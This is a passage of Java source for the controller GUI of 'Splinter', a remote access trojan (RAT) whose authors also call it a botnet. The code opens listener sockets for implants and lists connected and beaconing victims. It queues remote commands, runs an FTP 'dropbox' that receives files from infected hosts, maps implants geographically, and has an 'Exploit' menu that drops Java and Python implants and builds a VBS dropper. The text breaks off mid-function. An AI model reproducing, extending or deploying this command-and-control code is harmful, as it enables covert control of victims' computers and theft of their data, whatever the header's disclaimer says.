/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/




package Controller.GUI;

import Controller.Drivers.Drivers;
import Controller.Thread.Thread_JLabels;
import Controller.Thread.Thread_ServerSocket;
import Controller.Thread.Thread_Terminal;
import Implant.Driver;
import Implant.FTP.FTP_ServerSocket;
import Implant.Payloads.MapSystemProperties;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Container;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.util.ArrayList;
import java.util.Vector;
import javax.swing.DefaultComboBoxModel;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.UIManager;
import javax.swing.border.BevelBorder;
import javax.swing.border.TitledBorder;
import javax.swing.table.TableColumn;

public class Splinter_GUI extends JFrame
  implements ActionListener
{
  String strMyClassName = getName();

  MapSystemProperties systemMap = null;
  public static final String STARTUP_IMPLANT_LISTEN_FOR_MULTIPLE_CONNECTIONS = "-L";
  public static FTP_ServerSocket ftpServerSocket = null;

  JMenuBar jmb = new JMenuBar();
  JMenu jmnuFile = new JMenu("File");
  JMenuItem jmnuitm_Exit = new JMenuItem("Exit       ");

  JMenu jmnuExploit = new JMenu("Exploit ");
  JMenu jmuImplant = new JMenu("Implant                    ");
  JMenuItem jmuitm_DropJavaImplant = new JMenuItem("Drop Java Implant                 ");
  JMenuItem jmuitm_DropPythonImplant = new JMenuItem("Drop Python Implant             ");
  JMenuItem jmuitm_CreateDropper = new JMenuItem("Create  Implant Dropper             ");
  private JTabbedPane tabbedPane_Main;
  private JTabbedPane tabbedPane_IMPLANTS;
  private static JTable_Solomon jtblConnectedAgents;
  private static JTable_Solomon jtblDisconnectedAgents;
  private static JTable_Solomon jtblBeaconingAgents;
  private static JTable_Solomon jtblLoggieAgents;
  public static JPanel_MainControllerWindow jpnlMainController;
  public static JPanel_MainControllerWindow jpnlBeaconCommandsControllerWindow;
  private JPanel_MainControllerWindow jpnlChatTerminal;
  public static Thread_ServerSocket thdServerSocket = null;
  public static Thread_JLabels thdWorkerJLabels = null;
  private JPanel jpnlMain;
  JSplitPane jspltPne_JTbl_And_Console = null;
  JSplitPane jspltPne_Main = null;

  JPanel jpnlTab_ConnectedImplants_Main = new JPanel();
  private JPanel jpnlHeading = new JPanel(new BorderLayout());
  private JPanel jpnlServerSocketSettings_Title = new JPanel(new GridLayout(3, 1));
  private JPanel jpnlJTable_Title = new JPanel(new BorderLayout());
  private JPanel jpnlJTable_DisconneectedImplants_Title = new JPanel(new BorderLayout());
  private JPanel jpnlJTable_BeaconingImplants_Title = new JPanel(new BorderLayout());
  private JPanel jpnlJTable_LoggingAgents_Title = new JPanel(new BorderLayout());
  private JPanel jpnlConsoleOut_Title = new JPanel(new BorderLayout());
  private JPanel jpnlConnectedImlants_Title = new JPanel();
  JPanel jpnlConnectionTab = new JPanel(new BorderLayout());

  JCheckBox jcbAutoScrollConsoleOut = new JCheckBox("Auto Scroll Console Out", true);
  JButton jbtnClearConsoleOut = new JButton("Clear Console Out");
  JComboBox jcbAppearance;
  JComboBox jcbFontSize;
  String[] arrTextSizes = { "Text Size", "12", "14", "16", "18", "20", "24", "26", "28", "30" };

  public JLabel jlblCurrentTime = new JLabel("0:0:0");
  public JLabel jlblZuluTime = new JLabel("0:0:0");
  public static JPanel_TextDisplayPane jtxtpne_ConsoleOut;
  JScrollPane jscrlPne_ConsoleOut;
  JLabel jlblImplant = new JLabel("Implant:");

  JPanel jpnlLogo = new JPanel();
  JLabel jlblLogo = new JLabel();

  JPanel jpnlConnectionStatus_1 = new JPanel(new BorderLayout());
  JPanel jpnlConnectionStatus_2 = new JPanel(new BorderLayout());
  JPanel jpnlConnectionStatus_3 = new JPanel(new BorderLayout());

  JPanel jpnlServerSettings = new JPanel();
  JPanel jpnlServerSocket = new JPanel();
  JLabel jlblEstablishServerSocket = new JLabel("Port to Establish Implant ServerSocket:  ");

  public boolean serverSocketOpen = false;
  JTextField jtfServerSocketPort = new JTextField(12);
  JButton jbtnEstablishServerSocket;
  JButton jbtnCloseServerSocket;
  JPanel jpnlFTP = new JPanel();
  JLabel jlblFTP_Port = new JLabel("Port to Establish FTP ServerSocket:        ");
  JTextField jtfPort_FTP = new JTextField("12");

  public static JLabel jlblFTP_Status_Text = new JLabel("              Established FTP Port:", 4);
  public static JLabel jlblFTP_Status = new JLabel("CLOSED", 2);
  JButton jbtnOpenFTP = null;
  JButton jbtnCloseFTP = null;
  JCheckBox jcbAutoAcceptFTP_Files = new JCheckBox("Auto Accept Files", false);

  JCheckBox jcbEnableLogging = new JCheckBox("Logging is Enabled", true);

  static JButton jbtnFTP_DropBox = new JButton("FTP DropBox");

  JPanel jpnlNorth = new JPanel(new BorderLayout());

  private JPanel jpnlSouth = new JPanel(new GridLayout(1, 1));
  JPanel jpnlHeapSize_Alignment = new JPanel(new BorderLayout());
  JPanel jpnlHeapSize = new JPanel();
  JLabel jlblHeapSize_Current_Text = new JLabel("Current Heap Size: ", 4);
  JLabel jlblHeapSize_Available_Text = new JLabel("Available Heap Space: ", 4);
  JLabel jlblHeapSize_Max_Text = new JLabel("Max Heap Size: ", 4);

  JLabel jlblHeapSize_Current = new JLabel("N/A ", 2);
  JLabel jlblHeapSize_Available = new JLabel("N/A ", 2);
  JLabel jlblHeapSize_Max = new JLabel("N/A ", 2);

  private JPanel jpnlConnectionStatus = new JPanel();

  static JLabel jlblServerSocketStatus_text = new JLabel("Status of Server Socket: ");
  public static JLabel jlblServerSocketStatus = new JLabel("CLOSED");
  public static JLabel jlblEstablishedPort_text = new JLabel("              Established Port: ", 4);
  public static JLabel jlblEstablishedPort = new JLabel("NOT ESTABLISHED ", 2);
  public static JLabel jlblNumberConnectedImplants_Text = new JLabel("              Connected Implants: ", 4);
  public static JLabel jlblNumberConnectedImplants = new JLabel("0 ", 2);
  public static JLabel jlblLHOST_ME_IP_Text = new JLabel("                LHOST (MY) IP:", 4);
  public static JLabel jlblLHOST_ME_IP = new JLabel("SOCKET CLOSED", 2);

  JPanel jpnlConnectToImplant = new JPanel();
  JLabel jlblConnectToImplant_IP = new JLabel("Enter Address to Connect to Host:         ");
  JLabel jlblConnectToImplant_Port = new JLabel("  Host Port Number: ");
  JLabel jlblBindingOption = new JLabel("  Bind to: ");
  String strBindingOption = "Select Binding Option           ";
  String strBindToImplant = "Bind to Implant";
  String strBindToController = "Bind to Controller";
  String strBindToRelay = "Bind to Relay";
  String strBindToCortana = "Bind to Cortana";
  String[] arrBindingOptions = { this.strBindingOption, this.strBindToImplant, this.strBindToController, this.strBindToRelay, this.strBindToCortana };
  JComboBox jcbBindingOption = null;
  JButton jbtnBindToHost = null;
  JTextField jtfIP_Address_To_Implant = new JTextField(12);
  JTextField jtfPort_Address_To_Implant = new JTextField(7);
  JButton jbtnBindToImplant;
  JButton jbtnConnectToController;
  JSplitPane jspltpne_BeaconTerminal = null;
  JScrollPane jscrlpneBeaconCommands = null;
  JPanel jpnlBeaconCommands = new JPanel(new GridLayout(1, 1));
  JPanel_BeaconCommand beaconCommand = new JPanel_BeaconCommand();

  public Splinter_GUI()
  {
    try
    {
      setTitle("Splinter - RAT vrs 1.41 - BETA");
      setColorScheme(1);
      Driver.alConnectedFTPClients = new ArrayList();
      Driver.instance_loaded_CONTROLLER = true;
      try
      {
        URL url_Img = Splinter_GUI.class.getResource("/Controller/Images/RAT_Icon.gif");

        Drivers.imgFrameIcon = new ImageIcon(Splinter_GUI.class.getResource("/Controller/Images/RAT_Icon.gif")).getImage();
        setIconImage(Drivers.imgFrameIcon);
      }
      catch (Exception localException1)
      {
      }

      try
      {
        UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
      }
      catch (Exception localException2)
      {
      }

      Drivers.alTerminals = new ArrayList();
      Driver.alRandomUniqueImplantIDs = new ArrayList();

      getContentPane().setLayout(new BorderLayout(0, 0));

      populateJMenu();

      getContentPane().setLayout(new BorderLayout());

      setBounds(60, 100, 1240, 750);

      initializeJTabbedPane();

      initializeControllerWindow();
      try
      {
        URL url_Img = Splinter_GUI.class.getResource("/Controller/Images/RAT_Logo.gif");

        this.jlblLogo.setIcon(new ImageIcon(Splinter_GUI.class.getResource("/Controller/Images/RAT_Logo.gif")));

        this.jpnlLogo.add(this.jlblLogo);

        this.jpnlHeading.add("East", this.jpnlLogo);
      }
      catch (Exception localException3)
      {
      }

      this.jtfIP_Address_To_Implant.addActionListener(this);

      this.jtfServerSocketPort.addActionListener(this);
      this.jtfPort_Address_To_Implant.addActionListener(this);

      jtblConnectedAgents.jbtnRefresh.addActionListener(this);
      jtblDisconnectedAgents.jbtnRefresh.addActionListener(this);
      jtblBeaconingAgents.jbtnRefresh.addActionListener(this);
      jtblLoggieAgents.jbtnRefresh.addActionListener(this);
      jtblDisconnectedAgents.jbtnDisconnectImplant.setVisible(false);
      jtblBeaconingAgents.jbtnDisconnectImplant.setVisible(false);
      jtblBeaconingAgents.jbtnGoogleMap.setVisible(false);
      jtblBeaconingAgents.jbtnRefresh.setVisible(false);
      jtblBeaconingAgents.jcbEnableGPS_Resolution.setVisible(false);

      jtblLoggieAgents.jbtnDisconnectImplant.setVisible(true);
      jtblLoggieAgents.jbtnDisconnectImplant.addActionListener(this);

      jtblLoggieAgents.jbtnGoogleMap.setVisible(false);

      jtblLoggieAgents.jcbEnableGPS_Resolution.setVisible(false);

      jtblDisconnectedAgents.jbtnRefresh.setVisible(false);
      jtblConnectedAgents.jbtnDisconnectImplant.addActionListener(this);
      jtblConnectedAgents.jbtnRefresh.setEnabled(false);
      jtblConnectedAgents.jbtnDisconnectImplant.setEnabled(false);

      jtblBeaconingAgents.jbtnDisconnectImplant.setEnabled(false);
      jtblBeaconingAgents.jbtnRefresh.setEnabled(false);

      jtblConnectedAgents.jbtnGoogleMap.setEnabled(false);
      jtblConnectedAgents.jbtnGoogleMap.addActionListener(this);
      jtblDisconnectedAgents.jbtnGoogleMap.setVisible(false);

      jtblConnectedAgents.jcbEnableGPS_Resolution.addActionListener(this);
      jtblDisconnectedAgents.jcbEnableGPS_Resolution.setVisible(false);

      this.jcbAppearance.addActionListener(this);
      this.jcbFontSize.addActionListener(this);

      this.jcbAppearance.setToolTipText("Appearance: Sets the Color Scheme");
      this.jcbFontSize.setToolTipText("Text Size: Sets the size of the characters displayed on the screen");

      if (Drivers.jtxtpne_CnslOut != null)
      {
        Drivers.jtxtpne_CnslOut.appendString(false, "*******************************************************************************", Drivers.clrForeground, Drivers.clrBackground);
        Drivers.jtxtpne_CnslOut.appendString(false, "*    Splinter -RAT version 1.41 - BETA Programmed by Solomon Sonya and Nick Kulesza                *", Drivers.clrForeground, Drivers.clrBackground);
        Drivers.jtxtpne_CnslOut.appendString(false, "*******************************************************************************", Drivers.clrForeground, Drivers.clrBackground);
      }

      Drivers.sop("Program Started.  -- Console Output Enabled: " + Drivers.outputEnabled + " -- Heap growth protection: not implemented yet");
      Drivers.sop("NOTE: Special character to omit reading the output streams upon command execution: \"&\" e.g. executing \"start notepad\" would cause the thread to wait until the notepad process is closed. Use this as a last resort as it may be buggy right now.  To avoid waiting on a process, use the special key to execute commands like that. Thus \"& start notepad\"");
    }
    catch (Exception e)
    {
      Drivers.eop(this.strMyClassName + "Constructor", this.strMyClassName, e, "FAIL! I wonder why I crashed.......", true);
    }

    manualResizeCols_ConnectedAgents();
    manualResizeCols_DisconnectedAgents();

    intializeFTP_Panel();

    setDefaultCloseOperation(0);

    Driver.myHandShake = Driver.getHandshakeData("%%%%%");

    addWindowListener(new WindowAdapter()
    {
      public void windowClosing(WindowEvent e)
      {
        Splinter_GUI.this.closeFrame();
      }
    });
  }

  public boolean intializeFTP_Panel()
  {
    try
    {
      this.jpnlFTP = new JPanel();
      this.jtfPort_FTP = new JTextField("21", 12);

      this.jcbAutoAcceptFTP_Files = new JCheckBox("Auto  Accept  Files", false);

      jbtnFTP_DropBox = new JButton("        Set FTP DropBox        ");
      this.jbtnOpenFTP = new JButton("Open FTP");
      this.jbtnCloseFTP = new JButton("Close FTP");

      this.jpnlFTP.add(this.jlblFTP_Port);
      this.jpnlFTP.add(this.jtfPort_FTP);
      this.jpnlFTP.add(this.jbtnOpenFTP);
      this.jpnlFTP.add(this.jbtnCloseFTP);
      this.jpnlFTP.add(jbtnFTP_DropBox);
      this.jpnlFTP.add(this.jcbAutoAcceptFTP_Files);

      this.jpnlConnectionStatus_3.add("West", this.jpnlFTP);

      this.jpnlConnectionStatus.add(jlblFTP_Status_Text);
      this.jpnlConnectionStatus.add(jlblFTP_Status);

      jlblFTP_Status.setOpaque(true);

      this.jcbAutoAcceptFTP_Files.addActionListener(this);
      jbtnFTP_DropBox.addActionListener(this);
      this.jbtnOpenFTP.addActionListener(this);
      this.jtfPort_FTP.addActionListener(this);
      this.jbtnCloseFTP.addActionListener(this);

      this.jbtnOpenFTP.setToolTipText("Establish the FTP ServerSocket Receiver Thread");
      this.jbtnCloseFTP.setToolTipText("Close the FTP ServerSocket Receiver Thread");

      this.jcbAutoAcceptFTP_Files.setEnabled(true);

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("intializeFTP_Panel", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean populateJMenu()
  {
    try
    {
      setJMenuBar(this.jmb);

      this.jmb.add(this.jmnuFile);
      this.jmnuFile.add(this.jmnuitm_Exit);

      this.jmb.add(this.jmnuExploit);
      this.jmnuExploit.add(this.jmuImplant);
      this.jmuImplant.add(this.jmuitm_CreateDropper);
      this.jmuImplant.add(this.jmuitm_DropJavaImplant);
      this.jmuImplant.add(this.jmuitm_DropPythonImplant);

      this.jmnuitm_Exit.addActionListener(this);
      this.jmuitm_DropJavaImplant.addActionListener(this);
      this.jmuitm_DropPythonImplant.addActionListener(this);
      this.jmuitm_CreateDropper.addActionListener(this);

      this.jmuitm_DropJavaImplant.setEnabled(false);
      this.jmuitm_DropPythonImplant.setEnabled(false);
      this.jmuitm_CreateDropper.setEnabled(true);

      validate();
      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("populateJMenu", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean manualResizeCols_ConnectedAgents()
  {
    try
    {
      jtblConnectedAgents.jtblMyJTbl.getColumn(Drivers.strImportantMessage_Header).setPreferredWidth(2);

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("manualResizeCols_ConnectedAgents", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean manualResizeCols_DisconnectedAgents()
  {
    try
    {
      jtblDisconnectedAgents.jtblMyJTbl.getColumn(Drivers.strDisconnectionTime_Header).setPreferredWidth(102);

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("manualResizeCols_ConnectedAgents", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean closeFrame()
  {
    try
    {
      if (Drivers.jop_Confirm("Close Splinter?", "Exit") == 0)
      {
        System.exit(0);
      }

      return false;
    }
    catch (Exception e)
    {
      Drivers.eop("closeFrame", this.strMyClassName, e, e.getLocalizedMessage(), false);
      System.exit(0);

      System.exit(0);
    }return true;
  }

  public void actionPerformed(ActionEvent ae)
  {
    try
    {
      if (ae.getSource() == this.jbtnEstablishServerSocket)
      {
        establishServerSocket();
      }
      else if (ae.getSource() == this.jbtnCloseServerSocket)
      {
        closeServerSocket();
      }
      else if (ae.getSource() == this.jbtnBindToImplant)
      {
        decideConnectionAction();
      }
      else if (ae.getSource() == this.jbtnClearConsoleOut)
      {
        if (Drivers.jop_Confirm("Clear Console Out?", "Confirm Action") == 0)
        {
          jtxtpne_ConsoleOut.clearTextPane();
        }

      }
      else if (ae.getSource() == this.jcbAutoScrollConsoleOut)
      {
        jtxtpne_ConsoleOut.autoScroll = this.jcbAutoScrollConsoleOut.isSelected();
      }
      else if (ae.getSource() == this.jtfIP_Address_To_Implant)
      {
        decideConnectionAction();
      }
      else if (ae.getSource() == this.jcbEnableLogging)
      {
        Driver.isLoggingEnabled = this.jcbEnableLogging.isSelected();
      }
      else if (ae.getSource() == this.jtfServerSocketPort)
      {
        establishServerSocket();
      }
      else if (ae.getSource() == this.jtfPort_Address_To_Implant)
      {
        decideConnectionAction();
      }
      else if (ae.getSource() == this.jbtnConnectToController)
      {
        decideConnectionAction();
      }
      else if (ae.getSource() == jtblConnectedAgents.jbtnRefresh)
      {
        Drivers.updateConnectedImplants();
        Drivers.jtblConnectedImplants.updateJTable = true;
      }
      else if (ae.getSource() == jtblConnectedAgents.jbtnDisconnectImplant)
      {
        disconnectSelectedAgent(-2);
      }
      else if (ae.getSource() == jtblLoggieAgents.jbtnDisconnectImplant)
      {
        disconnectLoggie();
      }
      else if (ae.getSource() == jtblConnectedAgents.jcbEnableGPS_Resolution)
      {
        try
        {
          Driver.enableGPS_Resolution = jtblConnectedAgents.jcbEnableGPS_Resolution.isSelected();
        }
        catch (Exception e)
        {
          Drivers.sop("Error attemtping to set GPS resultion state");
        }

      }
      else if (ae.getSource() == jtblConnectedAgents.jbtnGoogleMap)
      {
        displaySelectedImplantOnMap();
      }
      else if (ae.getSource() == this.jcbAppearance)
      {
        setColorScheme(this.jcbAppearance.getSelectedIndex());
      }
      else if (ae.getSource() == this.jcbFontSize)
      {
        setTextSize(this.jcbFontSize.getSelectedIndex());
      }
      else if (ae.getSource() == this.jmnuitm_Exit)
      {
        closeFrame();
      }
      else if (ae.getSource() == this.jmuitm_DropJavaImplant)
      {
        Driver.dropImplantFile("/Implant/Binaries/Implants/Java/Splinter.jar", "Splinter.jar");
      }
      else if (ae.getSource() == this.jmuitm_DropPythonImplant)
      {
        Driver.dropImplantFile("/Implant/Binaries/Implants/Python/Splinter.py", "Splinter.py");
      }
      else if (ae.getSource() == this.jmuitm_CreateDropper)
      {
        Dialog_DropperVBS jdlgDropper = new Dialog_DropperVBS();
        jdlgDropper.show(true);
      }
      else if (ae.getSource() == this.jcbAutoAcceptFTP_Files)
      {
        Driver.autoAcceptFTP_Files = this.jcbAutoAcceptFTP_Files.isSelected();

        Drivers.sop("Auto Accept FTP Files: " + Driver.autoAcceptFTP_Files);
      }
      else if (ae.getSource() == jbtnFTP_DropBox)
      {
        setFTP_DropBoxDirectory();
      }
      else if (ae.getSource() == this.jbtnOpenFTP)
      {
        establishFTP();
      }
      else if (ae.getSource() == this.jtfPort_FTP)
      {
        establishFTP();
      }
      else if (ae.getSource() == this.jbtnCloseFTP)
      {
        closeFTP();
      }
      else if (ae.getSource() == this.jbtnBindToHost)
      {
        decideConnectionAction();
      }
      else if (ae.getSource() == jtblBeaconingAgents.jbtnClear)
      {
        Driver.alBeaconTerminals.clear();
        Drivers.updateBeaconImplants();
      }
      else if (ae.getSource() == jtblLoggieAgents.jbtnRefresh)
      {
        jtblLoggieAgents.updateJTable = true;
      }
      else
      {
        JPanel_BeaconCommand instance = null;

        for (int i = 0; i < Drivers.alBeaconCommands_GUI.size(); i++)
        {
          instance = (JPanel_BeaconCommand)Drivers.alBeaconCommands_GUI.get(i);

          if (ae.getSource() == instance.jbtnAddBeaconCommand)
          {
            JPanel_BeaconCommand CMD = new JPanel_BeaconCommand();
            CMD.jbtnAddBeaconCommand.addActionListener(this);
            CMD.jbtnDeleteThisCommand.addActionListener(this);

            Drivers.alBeaconCommands_GUI.add(CMD);

            updateBeaconingCommandList_GUI();
          }
          else if (ae.getSource() == instance.jbtnDeleteThisCommand)
          {
            try
            {
              if (Drivers.alBeaconCommands_GUI.size() > 1)
              {
                Drivers.alBeaconCommands_GUI.remove(i);
                updateBeaconingCommandList_GUI();
              }
            }
            catch (Exception localException1)
            {
            }
          }
        }
      }
      validate();
    }
    catch (Exception e)
    {
      Drivers.eop(this.strMyClassName + "'s Action Performed", this.strMyClassName, e, "", true);
    }

    validate();
  }

  public boolean disconnectLoggie()
  {
    try
    {
      int indexToRemove = jtblLoggieAgents.getSelectedRowIndex();

      if ((indexToRemove < 0) || (indexToRemove > Driver.alLoggingAgents.size())) {
        return false;
      }

      ((Thread_Terminal)Driver.alLoggingAgents.get(indexToRemove)).sktMyConnection.close();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("disconnectLoggie", this.strMyClassName, e, "", false);
    }

    return false;
  }

  public boolean updateBeaconingCommandList_GUI()
  {
    try
    {
      this.jpnlBeaconCommands.removeAll();
      this.jpnlBeaconCommands.setLayout(new GridLayout(Drivers.alBeaconCommands_GUI.size(), 1));

      for (int i = 0; i < Drivers.alBeaconCommands_GUI.size(); i++)
      {
        this.jpnlBeaconCommands.add((Component)Drivers.alBeaconCommands_GUI.get(i));
        ((JPanel_BeaconCommand)Drivers.alBeaconCommands_GUI.get(i)).setIndex(i);
      }

      validate();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("updateBeaconingCommandList_GUI", this.strMyClassName, e, "", false);
    }

    return false;
  }

  public boolean decideConnectionAction()
  {
    try
    {
      String bindingOption = (String)this.jcbBindingOption.getSelectedItem();
      if ((bindingOption == null) || (bindingOption.trim().equals("")))
      {
        Drivers.jop_Error("Please select a valid binding option                   ", "Unable to complete selection action");
        return false;
      }

      bindingOption = bindingOption.trim();

      if (bindingOption.equalsIgnoreCase(this.strBindToImplant))
      {
        return connectToImplant(true, false, false, false);
      }

      if (bindingOption.equalsIgnoreCase(this.strBindToController))
      {
        return connectToImplant(false, true, false, false);
      }

      if (bindingOption.equalsIgnoreCase(this.strBindToRelay))
      {
        return connectToImplant(false, true, false, false);
      }

      if (bindingOption.equalsIgnoreCase(this.strBindToCortana))
      {
        Drivers.jop("Unable to Continue. This feature is still under development");
        return false;
      }

      Drivers.jop_Error("Please select a valid binding option                   ", "Unable to complete selection action");
      return false;
    }
    catch (Exception e)
    {
      Driver.eop("decideConnectionAction", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean closeFTP()
  {
    try
    {
      if ((FTP_ServerSocket.svrSocket != null) && (FTP_ServerSocket.FTP_ServerSocket_Is_Open))
      {
        if (Drivers.jop_Confirm("FTP ServerSocket is open on port " + FTP_ServerSocket.PORT + ".  Do you Wish to close?", "Close FTP ServerSocket") == 0)
        {
          FTP_ServerSocket.continueRun = false;
          FTP_ServerSocket.FTP_ServerSocket_Is_Open = false;

          jlblFTP_Status.setText("CLOSED");
          try
          {
            ftpServerSocket.dismissClosedSocketError = true;
            FTP_ServerSocket.svrSocket.close();
          } catch (Exception localException1) {
          }
          return true;
        }

      }
      else
      {
        Drivers.jop_Error("FTP ServerSocket Does not appear to be running.", "Unable to complete action");
        return false;
      }

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("closeFTP", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean establishFTP()
  {
    try
    {
      if ((FTP_ServerSocket.svrSocket != null) && (FTP_ServerSocket.FTP_ServerSocket_Is_Open))
      {
        if (Drivers.jop_Confirm("FTP ServerSocket is open on port " + FTP_ServerSocket.PORT + ".  Do you Wish to close?", "Close FTP ServerSocket") == 0)
        {
          FTP_ServerSocket.continueRun = false;
          FTP_ServerSocket.FTP_ServerSocket_Is_Open = false;
          ftpServerSocket.dismissClosedSocketError = true;
          try { FTP_ServerSocket.svrSocket.close();
          } catch (Exception localException1) {
          }
          jlblFTP_Status.setText("CLOSED");
          jlblFTP_Status.setBackground(Color.red);
          jlblFTP_Status.setForeground(Color.white);
        }
        else
        {
          return false;
        }

      }

      if ((Driver.fleFTP_DropBoxDirectory == null) || (!Driver.fleFTP_DropBoxDirectory.exists()) || (!Driver.fleFTP_DropBoxDirectory.isDirectory()))
      {
        setFTP_DropBoxDirectory();
      }

      int port = 21;
      try
      {
        port = Integer.parseInt(this.jtfPort_FTP.getText().trim());
        if ((port < 1) || (port > 65534))
        {
          throw new Exception("Port is out of range");
        }

      }
      catch (Exception ee)
      {
        Drivers.jop_Error("Invalid FTP Port Entered.                       ", "Unable to complete selected action");
        return false;
      }

      ftpServerSocket = new FTP_ServerSocket(false, true, port, jlblFTP_Status);
      ftpServerSocket.start();

      Driver.FTP_ServerSocket = ftpServerSocket;

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("establishFTP", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public static File setFTP_DropBoxDirectory()
  {
    File fleSelected = null;
    try
    {
      File dropDirectory = Driver.querySelectFile(false, "Please Select the Directory to save received files", 1, false, false);

      if ((dropDirectory != null) && (dropDirectory.isDirectory()) && (dropDirectory.exists()))
      {
        Driver.fleFTP_DropBoxDirectory = dropDirectory;
        Drivers.sop("FTP DropBox Directory Set to: " + Driver.fleFTP_DropBoxDirectory.getCanonicalPath());
        jbtnFTP_DropBox.setToolTipText("FTP DropBox Directory Set to: " + Driver.fleFTP_DropBoxDirectory.getCanonicalPath());
        try { jpnlMainController.jbtnOpenDropBox.setToolTipText("FTP DropBox Directory Set to: " + Driver.fleFTP_DropBoxDirectory.getCanonicalPath());
        } catch (Exception localException1)
        {
        }
      }
      else if ((Driver.fleFTP_DropBoxDirectory != null) && (Driver.fleFTP_DropBoxDirectory.exists()) && (Driver.fleFTP_DropBoxDirectory.isDirectory()))
      {
        Drivers.jop_Error("No FTP Save Location Selected. Reverting to previous location at: \n" + Driver.fleFTP_DropBoxDirectory.getCanonicalPath(), "FTP DropBox Not Selected");
      }
      else
      {
        Drivers.jop_Error("No FTP Save Location Selected", "FTP DropBox Not Selected");
      }

      if ((Driver.fleFTP_DropBoxDirectory == null) || (!Driver.fleFTP_DropBoxDirectory.exists()) || (!Driver.fleFTP_DropBoxDirectory.isDirectory()))
      {
        return setFTP_DropBoxDirectory();
      }

      return Driver.fleFTP_DropBoxDirectory;
    }
    catch (Exception e)
    {
      Drivers.eop("setFTP_DropBoxDirectory", "Splinter_GUI", e, e.getLocalizedMessage(), false);
    }

    return Driver.fleFTP_DropBoxDirectory;
  }

  public boolean displaySelectedImplantOnMap()
  {
    try
    {
      if (Drivers.alTerminals.size() < 1)
      {
        Drivers.jop_Error("There are no implants to display at this time.                         ", "Cannot Complete Selected Action");
        return false;
      }

      int indexToShow = jtblConnectedAgents.getSelectedRowIndex();

      if (indexToShow < 0)
      {
        Drivers.jop_Error("Please select an implant to display on map.                        ", "Cannot Complete Selected Action");
        return false;
      }

      Thread_Terminal threadToDisplay = (Thread_Terminal)Drivers.alTerminals.get(indexToShow);

      threadToDisplay.showMyselfOnMap();

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("displaySelectedImplantOnMap", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public static boolean disconnectSelectedAgent(int preSelectedIndex)
  {
    try
    {
      if (Drivers.alTerminals.size() < 1)
      {
        Drivers.jop_Error("There are no implants to remove at this time.                         ", "Cannot Disconnect Implant - No Implants Populated");
        return false;
      }

      int indexToRemove = 0;

      if (preSelectedIndex == -2)
      {
        indexToRemove = jtblConnectedAgents.getSelectedRowIndex();
      }
      else
      {
        indexToRemove = preSelectedIndex;
      }

      if (indexToRemove < 0)
      {
        Drivers.jop_Error("Please select an implant to remove.                        ", "Cannot Disconnect Implant - No Implant Selected");
        return false;
      }

      Thread_Terminal threadToDelete = (Thread_Terminal)Drivers.alTerminals.get(indexToRemove);

      if (Drivers.jop_Confirm("You have chosen to remove Implant: " + threadToDelete.getJListData() + "\nDo you wish to continue?", "Confirm Punting Selected Implant") != 0)
      {
        return true;
      }

      Drivers.sop("Terminating Thread ID: " + threadToDelete.getThreadID());

      if (threadToDelete.myCareOfAddressNode != null)
      {
        Drivers.jop_Message("Need to Here and input protocol to remove a Care-Of Address Node.\nPlease Notify Solomon about this Message.");
        return false;
      }

      if (threadToDelete.sktMyConnection != null)
      {
        try
        {
          threadToDelete.sktMyConnection.close();
          threadToDelete.closeThread();
        } catch (Exception localException1) {
        }
      }
      threadToDelete.continueRun = false;
